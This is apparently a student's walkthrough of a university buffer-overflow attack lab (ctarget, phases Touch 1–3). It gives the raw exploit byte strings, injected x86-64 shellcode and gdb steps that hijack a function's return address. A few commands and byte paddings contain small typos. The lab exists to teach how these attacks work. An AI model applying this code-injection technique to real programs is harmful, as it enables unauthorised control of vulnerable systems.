**Preparation**

First, we need to disassemble ```./ctarget```. Type

```
objdump d ctarget > ctarget.d
```

Importantly, we find the in function "getbuf", it allocates the buffer zone with size ```0x28```.



**Touch 1**

It is the basic one. We only need to fill the buffer zone and change the ```ret``` address to touch 1 -- ```0x4017c0```.

Notice that our machine uses little endian to store bytes. So exploit 1 can be

```
00 11 22 33 44 55 66 77 88 99
00 11 22 33 44 55 66 77 88 99
00 11 22 33 44 55 66 77 88 99
00 11 22 33 44 55 66 77 88 99
c0 17 40 00 00 00 00 00 00 00
```



**Touch 2**

Other than change the ```ret``` address, this touch also requires its parameter stored in ```%rdi``` equal to cookie ```0x59b997fa```.

So we need to do these two steps. First, inject a code that set ```%rdi``` to ```0x59b997fa``` and return to touch 2. Second, change the ```ret``` address of "getbuf" to the code we injected.

To do the first step, we first need to understand how ```ret``` command works in detail.

Every time we call a function "callee", it allocates some memory in the stack and store the address of "caller". When the ```ret``` line is executed, it turn to the return address in the stack and jump to the address of "caller".

So we can write an assembly code "ci.s" that functions as the first step.

```assembly
movq    $0x59b997fa, %rdi
pushq   $0x4017ec
ret
```

Then we can get the byte representation of this assembly code. Type in terminal

```
gcc -c ci.s
objdump -d ci.o > ci.d
open ci.d
```

Then we get

```assembly
ci.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	push   $0x4017ec
   c:	c3                   	ret
```

Then the second step. We must know the address of the code we injected. Actually, these bytes are stored in the top of the stack allocated by "getbuf". So we only need to set a breakpoint right after the stack memory is allocated and see ```%rsp```. Type in gdb

```
(gdb) break *0x4017ac
(gdb) run -q
(gdb) print /x $rsp
$1 = 0x5561dc78
```

This is the address we need to inject to ```ret``` of "getbuf".

So exploit 2 can be

```
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 00 00
```



**Touch 3**

First study the function "hexmatch".

```c
int hexmatch(unsigned cookie, char *s)
{
    char cbuf[105];
    char *t = cbuf+random()%100;
    sprintf(t,"%.8x",cookie);
    return strncmp(s,t)==0;
}
```

So we need to store the string representation of cookie "59b997fa" and pass it to ```(%rdi)```.

However, we cannot store it in the buffer zone of "getbuf" because it may be broken by the stack memory of "hexmatch". We need to store it in somwhere just superior to "getbuf", which can be function "test". Then "59b997fa" can be stored right below the ```ret``` address of "getbuf".

Works below are similar to touch 2.

```
(gdb) break *0x40196c
(gdb) run -q
(gdb) p /x $rsp
$1 = 0x5561dca8
```

So we write the assembly code and get the byte representation.

```assembly
ci.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	68 fa 18 40 00       	push   $0x4018fa
   c:	c3                   	ret
```

So exploit 3 can be

```
48 c7 c7 a8 dc 61 55
68 fa 18 40 00
c3
00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```